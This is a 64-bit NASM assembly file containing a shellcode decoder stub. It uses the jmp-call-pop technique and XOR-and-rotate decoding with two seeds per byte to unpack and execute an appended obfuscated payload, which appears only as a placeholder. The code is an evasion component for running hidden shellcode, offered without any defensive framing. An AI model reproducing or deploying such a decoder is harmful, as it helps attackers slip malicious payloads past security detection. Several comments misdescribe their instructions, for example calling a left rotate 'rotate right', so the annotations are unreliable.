BITS 64

SECTION .text
global main

main:
  jmp short call_decoder            ; jmp-call-pop
decoder:
  pop rsi                           ; Load shellcode address
  xor rdi, rdi                      ; Clear rdi register (Value + Seed counter +2 )
  xor rbx, rbx                      ; Clear rax & rdx
  mul rbx                           ; Clear rax & rdx
  xor r8, r8                        ; Clear r8 registers
decode:
  mov bl, byte [rsi + rdi]          ; Load new value in bl
  mov dl, byte [rsi + rdi + 1]      ; Load new first seed in dl
  mov r8b, byte [rsi + rdi + 2]     ; Load new second seed in r8b
  xor bl, dl                        ; Check if end of shellcode (2 x 0xbb)
  jz short shellcode                ; Jump if end of decoding
  mov bl, byte [rsi + rdi]          ; Reload byte to decode in bl
  xor bl, r8b                       ; Decoding: Xor with seconde seed
  mov cl, r8b                       ; Add number of bit rotations in CL (second seed)
  rol bl, cl                        ; Decoding: Rotate right (x second seed)
  xor bl, dl                        ; Decoding: Xor with first seed
  mov cl, dl                        ; Add number of bit rotations in CL (first seed)
  ror bl, cl                        ; Decoding: Xor with first seed
  mov byte [rsi + rax], bl          ; Write value in bl to stack
  add rdi, 3                        ; Increment seed counter by 3
  inc rax                           ; Increment value counter by 1
  jmp short decode                  ; Jump to decode next value
call_decoder:
  call decoder
  shellcode: db obfuscated_shellcode

; nasm -f bin -o enc_time.bin enc_time.s